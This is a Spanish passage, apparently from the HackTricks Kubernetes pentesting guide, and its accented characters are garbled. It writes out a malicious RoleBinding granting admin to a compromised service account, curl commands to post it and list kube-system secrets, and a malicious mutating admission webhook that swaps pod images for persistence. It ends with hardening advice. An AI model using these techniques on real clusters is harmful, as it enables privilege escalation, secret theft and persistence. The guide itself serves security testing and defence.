El privilegio de crear Rolebindings permite a un usuario **vincular roles a una cuenta de servicio**. Este privilegio puede llevar potencialmente a una escalada de privilegios porque **permite al usuario vincular privilegios de administrador a una cuenta de servicio comprometida**.

El siguiente ClusterRole utiliza el verbo especial _bind_ que permite a un usuario crear un RoleBinding con el ClusterRole _admin_ (rol de alto privilegio predeterminado) y agregar cualquier usuario, incluido √©l mismo, a este ClusterRole de administrador.

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_with\_bind\_verb.png)

Luego es posible crear **`malicious-RoleBinging.json`**, que **vincula el rol de administrador a otra cuenta de servicio comprometida:**

```javascript
{
"apiVersion": "rbac.authorization.k8s.io/v1",
"kind": "RoleBinding",
"metadata": {
"name": "malicious-rolebinding",
"namespaces": "default"
},
"roleRef": {
"apiGroup": "*",
"kind": "ClusterRole",
"name": "admin"
},
"subjects": [
{
"kind": "ServiceAccount",
"name": "compromised-svc"
"namespace": "default"
}
]
}
```

El prop√≥sito de este archivo JSON es vincular el "ClusterRole" de administrador (l√≠nea 11) a la cuenta de servicio comprometida (l√≠nea 16).

Ahora, lo √∫nico que tenemos que hacer es enviar nuestro JSON como una solicitud POST a la API utilizando el siguiente comando CURL:

```bash
curl -k -v -X POST -H "Authorization: Bearer <JWT TOKEN>" \
-H "Content-Type: application/json" \
https://<master_ip>:<port>/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings \
-d @malicious-RoleBinging.json
```

Despu√©s de que el **rol de administrador se vincule a la cuenta de servicio "compromised-svc"**, podemos usar el token de la cuenta de servicio comprometida para **enumerar secretos**. El siguiente comando CURL lo har√°:

```bash
curl -k -v -X POST -H "Authorization: Bearer <COMPROMISED JWT TOKEN>"\
-H "Content-Type: application/json"
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secret
```

## Otros ataques

### Aplicaci√≥n de proxy de sidecar

Por defecto, no hay ning√∫n cifrado en la comunicaci√≥n entre los pods. Autenticaci√≥n mutua, de dos v√≠as, de pod a pod.

#### Crear una aplicaci√≥n de proxy de sidecar <a href="#crear-una-aplicacion-de-proxy-de-sidecar" id="crear-una-aplicacion-de-proxy-de-sidecar"></a>

Crea tu archivo .yaml

```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```

Edita tu archivo .yaml y agrega las l√≠neas comentadas:

```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```

Ver los registros del proxy:

```bash
kubectl logs app -C proxy
```

M√°s informaci√≥n en: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Controlador de admisi√≥n malicioso

Un controlador de admisi√≥n es un fragmento de c√≥digo que **intercepta las solicitudes al servidor de API de Kubernetes** antes de la persistencia del objeto, pero **despu√©s de que la solicitud est√© autenticada** y **autorizada**.

Si un atacante logra **inyectar un controlador de admisi√≥n de mutaci√≥n**, podr√° **modificar solicitudes ya autenticadas**. Esto le permitir√° potencialmente escalar privilegios y, m√°s com√∫nmente, persistir en el cl√∫ster.

Ejemplo de [https://blog.rewanthtammana.com/creating-malicious-admission-controllers](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):

```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```

Espera hasta que el servidor de webhook est√© listo. Verifica el estado:

```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```

![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Una vez que tengamos nuestro webhook de mutaci√≥n malicioso en funcionamiento, vamos a implementar un nuevo pod.

```bash
kubectl run nginx --image nginx
kubectl get po -w
```

Espera de nuevo hasta que veas el cambio en el estado del pod. Ahora podr√°s ver el error `ErrImagePull`. Verifica el nombre de la imagen con cualquiera de las consultas.

```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```

![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Como se puede ver en la imagen anterior, intentamos ejecutar la imagen `nginx`, pero la imagen ejecutada finalmente es `rewanthtammana/malicious-image`. ¬øQu√© acaba de suceder?

#### Aspectos t√©cnicos <a href="#heading-technicalities" id="heading-technicalities"></a>

Vamos a explicar lo que acaba de suceder. El script `./deploy.sh` que ejecutaste cre√≥ un controlador de admisi√≥n de webhook mutante. Las siguientes l√≠neas en el controlador de admisi√≥n de webhook mutante son responsables de los resultados anteriores.

```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```

El fragmento anterior reemplaza la primera imagen del contenedor en cada pod con `rewanthtammana/malicious-image`.

## Mejores pr√°cticas

### **Evitar el montaje autom√°tico de tokens de cuenta de servicio en los pods**

Cuando se crea un pod, autom√°ticamente se monta una cuenta de servicio (por defecto, la cuenta de servicio predeterminada en el mismo espacio de nombres). No todos los pods necesitan la capacidad de utilizar la API desde su interior.

A partir de la versi√≥n 1.6+, es posible evitar el montaje autom√°tico de tokens de cuenta de servicio en los pods utilizando `automountServiceAccountToken: false`. Se puede utilizar en cuentas de servicio o en pods.

En una cuenta de servicio, se debe agregar de la siguiente manera:\\

![](https://www.cyberark.com/wp-content/uploads/2018/12/serviceAccount\_with\_autoamountServiceAccountToken\_false.png)

Tambi√©n es posible utilizarlo en el pod:\\

![](https://www.cyberark.com/wp-content/uploads/2018/12/pod\_with\_autoamountServiceAccountToken\_false.png)

### **Conceder permisos espec√≠ficos a usuarios en RoleBindings\ClusterRoleBindings**

Al crear RoleBindings\ClusterRoleBindings, aseg√∫rese de que solo los usuarios que necesitan el rol en el enlace est√©n incluidos. Es f√°cil olvidar usuarios que ya no son relevantes dentro de dichos grupos.

### **Utilizar Roles y RoleBindings en lugar de ClusterRoles y ClusterRoleBindings**

Cuando se utilizan ClusterRoles y ClusterRoleBindings, se aplican en todo el cl√∫ster. Un usuario en dicho grupo tiene permisos sobre todos los espacios de nombres, lo cual a veces es innecesario. Los Roles y RoleBindings se pueden aplicar en un espacio de nombres espec√≠fico y proporcionan otra capa de seguridad.

### **Utilizar herramientas automatizadas**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Referencias**

{% embed url="https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions" %}

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1" %}

***

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**, ¬°consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>
